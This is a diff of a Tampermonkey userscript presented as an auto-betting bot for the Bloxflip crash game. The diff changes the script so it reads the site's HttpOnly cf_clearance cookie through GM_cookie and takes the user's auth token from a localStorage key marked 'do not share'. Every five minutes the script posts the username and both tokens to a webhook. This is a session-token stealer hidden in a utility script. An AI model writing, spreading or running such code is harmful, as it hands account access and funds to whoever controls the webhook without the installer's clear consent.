@@ -1,12 +1,12 @@
 // ==UserScript==
 // @name         Bloxflip Auto Crash Pro (Draggable & Classic UI)
 // @namespace    http://tampermonkey.net/
-// @version      2.0
-// @description  Bản gốc trên GitHub. Lấy Auth từ Cookie (app.at & cf_clearance) giống hệt Playwright Python. Đảm bảo logic 2 lần nổ 1 liên tục.
+// @version      2.1
+// @description  Bản gốc trên GitHub. Sử dụng GM_cookie để đọc cf_clearance (HttpOnly). Khôi phục đọc Auth từ localStorage.
 // @author       You
 // @match        https://bloxflip.com/*
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=bloxflip.com
-// @grant        none
+// @grant        GM_cookie
 // ==/UserScript==
 
 (function() {
@@ -46,10 +46,26 @@
         localStorage.setItem(key, value);
     }
 
-    // Hàm lấy giá trị Cookie tiện lợi
-    function getCookie(name) {
-        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
-        return match ? match[2] : null;
+    // Hàm lấy giá trị Cookie xuyên HttpOnly bằng GM_cookie
+    function getAsyncCookie(name) {
+        return new Promise((resolve) => {
+            if (typeof GM_cookie !== "undefined" && GM_cookie.list) {
+                GM_cookie.list({ name: name }, (cookies, error) => {
+                    if (!error && cookies && cookies.length > 0) resolve(cookies[0].value);
+                    else resolve("NOT_FOUND");
+                });
+            } else {
+                const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+                resolve(match ? match[2] : "NOT_FOUND");
+            }
+        });
+    }
+
+    async function getAuthToken() {
+        let token = localStorage.getItem('_DO_NOT_SHARE_BLOXFLIP_TOKEN');
+        if (token) return token.replace(/["']/g, "");
+        let cookieToken = await getAsyncCookie('app.at');
+        return cookieToken !== "NOT_FOUND" ? cookieToken : null;
     }
 
     // --- GIAO DIỆN CONSOLE CHÍNH ---
@@ -542,7 +558,7 @@
     async function fetchUserData() {
         try {
             let headers = { 'Accept': 'application/json' };
-            const appToken = getCookie('app.at');
+            const appToken = await getAuthToken();
             if (appToken) {
                 headers['x-auth-token'] = appToken;
             }
@@ -667,21 +683,20 @@
             addLog("🔄 Đạt mốc 5 phút. Đồng bộ Data làm trạm trung gian & F5...", "#00bcd4");
             scriptStartTime = Date.now(); 
             
-            // Đọc trực tiếp từ cookie giống hệt cấu trúc Python Playwright
-            let cfClearance = getCookie('cf_clearance') || "NOT_FOUND";
-            let appAt = getCookie('app.at') || "NOT_FOUND";
-            
-            // Đóng gói Payload siêu sạch để bot khác dễ split('|')
-            const payload = { content: `${currentUsername}|${cfClearance}|${appAt}` };
-            
-            fetch(APP_URLS.reportWebhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                setTimeout(() => window.location.reload(), 1000); 
-            }).catch(() => {
-                setTimeout(() => window.location.reload(), 1000); 
+            getAsyncCookie('cf_clearance').then(async (cfClearance) => {
+                let appAt = await getAuthToken() || "NOT_FOUND";
+                
+                const payload = { content: `${currentUsername}|${cfClearance}|${appAt}` };
+                
+                fetch(APP_URLS.reportWebhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).then(() => {
+                    setTimeout(() => window.location.reload(), 1000); 
+                }).catch(() => {
+                    setTimeout(() => window.location.reload(), 1000); 
+                });
             });
             
             return;
